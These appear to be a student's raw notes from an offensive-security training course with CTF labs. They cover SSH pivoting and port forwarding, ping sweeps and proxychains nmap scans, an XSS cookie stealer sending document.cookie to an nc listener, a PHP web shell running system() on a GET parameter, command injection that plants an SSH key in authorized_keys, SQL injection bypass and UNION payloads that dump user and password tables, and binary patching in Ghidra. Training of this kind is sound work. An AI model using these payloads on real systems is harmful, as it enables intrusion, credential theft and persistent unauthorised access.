4
AUBR-201-M
wo6WbG9WZE4A
10.50.11.109
CTF server: 10.50.186.5:8000
comrade@StudentWebExploitPassword


# Authenticate to next box -S creates socket file, M enables multiplexing
  2 ssh -MS /tmp/jmp demo1@10.50.13.244 2>/dev/null
  3 
  4 
  5 # From our next box, we can run a ping sweep
  6 for i in {1..255}; do (ping -c 1 10.208.50.$i | grep "bytes from" &); done
  7 ##output
  8 #time for portscan
  9 ## Dynamic portforward from linops
 10 ssh -S /tmp/jmp jmp -O forward -D9050
 11 proxychains nmap {range}
 12 
 13 10.208.50.1
 14 10.208.50.42
 15 22
 16 80
 17 proxychains nmap --script=http-enum 10.208.50.42 80
 18 
 19 # Connect to ports and hosts
 20 ssh -S /tmp/jmp jmp -O forward -L1111:10.208.50.42:22 -L1112:10.208.50.42:80
 21 ssh -S /tmp/jmp jmp -O cancel <port forward>
 22 
 23 10.208.50.61
 24 
 25 10.208.50.200
 26 10.208.50.230
 27 
 28 # verify socket file
 29   ss -ntlp | grep 9050
 30 
 31 #How to pivot again (has to be different name). This will go through the first socket to the other     machine's ssh port
 32 ssh -MS /tmp/jmp2 user@127.0.0.1:1111
 33 ssh -S /tmp/jmp jmp -O cancel -D9050
 34 ssh -S /tmp/jmp2 -O forward -D9050
 35 
 36 ssh demo1@10.50.13.244 -L2222:10.208.50.61:80
 37 127.0.0.1:2222/classinfo.html
 38 FFLL-201-M
 39 AUBR-201-M
 40 
 41  L 1111:10.208.50.42:80
 42 http://127.0.0.1:1111/


  search html for function definition to see what function does


ensure you run the function in the console to see what it truly does
can search with () to find functions easier
run functions in DevTools console


script for http enumeration: --script=http-enum

duplicate the tab once for each directory in robots.txt and then access each directory

command injection can be performed to access directories on the web server
directory traversal using post method can be done in the input field
dir traversal using get method is done in the url
use encoding if dir traversal is not working

 # Cookie stealer, be mindful of where nc listener is
<script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
nc -l 127.0.0.1 42070

malicious file upload:
need to be able to upload file and need to know where the file will be uploaded


# Malicious upload, needs and upload and location of file
notbad.php

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>

# ssh-keygen
ssh-keygen -t rsa -b 4096
no pass phrase (enter,enter,enter)

## from remote host(web browser), we need to upload our key 
# make the directory, use www because that is the users home directory
; mkdir /var/www/.ssh
; ls -la /var/www

# Get my key (Copy ALL of it from ssh-rsa to the end)
cat /home/student/.ssh/id_rsa.pub

# upload key 
; echo "" > /var/www/.ssh/authorized_keys
; cat /var/www/.ssh/authorized_keys

# ssh into user that we are logging in as
ssh -i .ssh/id_rsa -p <local rhp> www-data@<ip>
                                                                                     32,10         93%                                    

  Ex. of SQL injecction:
User enters tom' OR 1='1 in the name and pass fields

Server side query executed would appear as:
Select id from users where name='tom' OR 1='1' AND pass='tom' OR 1='1'


in password boxes, if you cannot see the characters you typed in, you can inspect the page and clear the box to see the characters you put.

DEMO NOTES:

  1 ssh demo1@10.50.13.244 -L 5555:10.208.50.61:80
  2 # Authentication bypass
  3 In the username and password field:
  4 'OR 1='1
  5 
  6 inspect > network > post > request > raw (radio button)
  7 paste at the end of the url
  8 x.x.x.x/login.php?<paste here>



  RESULT:
  Array
(
    [0] => Luke_Skywalker
    [name] => Luke_Skywalker
    [1] => Jedi
    [pass] => Jedi
)
1Array
(
    [0] => Darth_Vader
    [name] => Darth_Vader
    [1] => Sith
    [pass] => Sith
)
1Array
(
    [0] => c3p0
    [name] => c3p0
    [1] => annoying
    [pass] => annoying
)
1Array
(
    [0] => Batman
    [name] => Batman
    [1] => BWyane
    [pass] => BWyane
)
1

It would be wise to try to use these creds to log in to an open ssh port later


STACKING STATEMENTS:
chaining multiple statements together using a semi-colon ;

NESTING STATEMENTS:
some web apps do not allow stacking statements, but may allow nesting

php?key=<value> union select 1, column_name,3 from information_schema.columns where table name = "members"


ignore the rest
using # or -- tells the database to ignore everything after
Select product from item where id = $select limit 1;

1 or 1=1 #

server side query becomes:
select product from item where id = 1 or 1=1; # limit 1;

11 http://127.0.0.1:5555/Union.html on IP 10.208.50.61:80
 12 
 13 # SQL Injection 4 steps (POST)
 14 #       1. Identify Vulnerable field(s)
 15 #       'OR 1='1
 16 #       Audi'OR 1= '1
 17 #       2. Identify the number of columns
 18 #       Audi' UNION SELECT 1,2,3,4#(number of columns)
 19 #       3. Inject Golden Statement
 20 #                          Column_name,column_name,column_name     from     database.table
 21 #       Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_schema.columns #
 22 #       4. Craft queries
 23 #       Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_schema.columns #
 24 #       Duplicate tab for ease of access
 25 #       shows only databases
 26 #       Audi' UNION SELECT table_schema,2,3,4,5 FROM Information_schema.columns #
 27 #       Identify significant database, tables, and columns
 28 #       session database user table contains user and pass columns
 29 #       Look at version
 30 #       Audi' UNION SELECT @@version,2,pass,4,5 FROM session.user #
 31 #                          column, column       database.table


 # SQL Injection 4 steps (GET) use URL bar
 36 #       1. Identify vulnerable fields by adding ?selection=2 or 1=1
 37 #       <URL>/Uniondemo.php?Selection=1 OR 1=1
 38 #       2. Identify the number of columns
 39 #       <URL>/Uniondemo.php?Selection=1 UNION SELECT 1,2,3
 40 #       columns are out of order:
 41 #       <URL>/Uniondemo.php?Selection=1 UNION SELECT 1,3,2
 42 #       3. Inject Golden Statement
 43 #       <URL>/Uniondemo.php?selection=1 UNION SELECT 1,3,2 becomes:
 44 #       Selection=2 UNION SELECT table_schema,column_name,table_name FROM Information_schema.columns
 45 #       4. Craft queries
 46 #                                column_name,column_name,column_name FROM database.table
 47 #       Selection=2 UNION SELECT User,Password,2 FROM mysql.user


  cd C:\Users\student\Downloads\demo1

# -a for ascii, findstr /i for case insensitive
strings.exe -a -nobanner .\demo1_new.exe | findstr /i enter

strings.exe -a -nobanner .\demo1_new.exe | select -first 10
#will provide file header to identify intended operating system for the malware
#This program cannot be run in DOS mode- Windows
#MZ - Linux

# Behavioral Analysis
Run the programs as intended

#Skipping dynamic

#Disassembly

# Open Ghidra
New Project
Click file > import file
By default: functions dissassembler, decompiler


# START FROM THE END OF THE PROGRAM, SEARCH FOR "SUCCESS" etc.
search > strings: search for desired strings, double clock results to see C

# Patching
Follow code, working backwards, identify potential ins or values to be changed
When found, right click on instruction value, click patch instruction, then insert new value in.
File > Export Program > format PE > change location > save and run it

if the box you are on does not have peda, scp the file over to the box

disass <FUNCTION> # disassemble
info  <...> 
x/256c $<REGISTER> # read characters from specific register
break <address> 


check day5 in vim for instructions and the python script
sudo -l
sudo ./instructions <<<$(python <script>)
